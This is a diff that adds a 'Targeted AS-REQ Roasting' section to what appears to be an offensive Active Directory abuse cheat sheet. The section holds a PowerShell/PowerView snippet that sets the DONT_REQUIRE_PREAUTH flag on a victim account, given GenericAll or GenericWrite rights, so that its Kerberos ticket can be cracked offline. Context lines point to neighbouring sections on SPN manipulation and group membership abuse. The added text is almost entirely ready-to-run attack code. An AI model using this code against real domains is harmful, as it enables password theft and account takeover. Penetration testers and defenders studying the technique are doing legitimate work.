@@ -210,6 +210,25 @@ Set-DomainObject -Credential $Cred -Identity <User to remove> -Clear erviceprinc
 ```
 
 
+## Targeted AS-REQ Roasting
+needed rights `GenericAll` or `GenericWrite`  
+
+- powerview
+```powershell
+Import-Module .\PowerView.ps1
+# Define the target user
+$TargetUser = "victim_user"
+
+# Fetch the current userAccountControl value
+$CurrentValue = (Get-ADUser -Identity $TargetUser -Properties userAccountControl).userAccountControl
+
+# Add the DONT_REQUIRE_PREAUTH flag (0x200000)
+$NewValue = $CurrentValue -bor 0x200000
+
+# Modify the userAccountControl
+Set-DomainObject -Identity $TargetUser -Set @{"userAccountControl" = $NewValue}
+```
+
 ## Add to group 
 needed rights `GenericAll` or `GenericWrite`  
 
